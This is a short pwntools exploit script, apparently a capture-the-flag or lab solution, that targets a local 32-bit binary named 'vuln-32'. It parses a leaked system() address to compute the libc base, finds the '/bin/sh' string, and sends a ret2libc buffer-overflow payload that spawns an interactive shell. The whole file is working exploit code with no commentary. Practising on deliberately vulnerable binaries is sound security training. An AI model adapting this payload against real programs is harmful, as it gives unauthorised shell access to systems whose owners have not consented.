from pwn import *


elf = context.binary = ELF("./vuln-32")

p = process()

p.recvuntil("at: ")
system_addr = int(p.recvline().decode().strip(),16)
libc = elf.libc
libc.address = system_addr - libc.sym["system"]

# 0x0000126a : pop edi ; pop ebp ; ret
binsh = next(libc.search(b"/bin/sh")) 
payload = flat([
    b"A" * 32,
    libc.sym["system"],
    libc.sym["system"] + 62,
    binsh,
])


# gdb.attach(p)
p.sendline(payload)



p.interactive()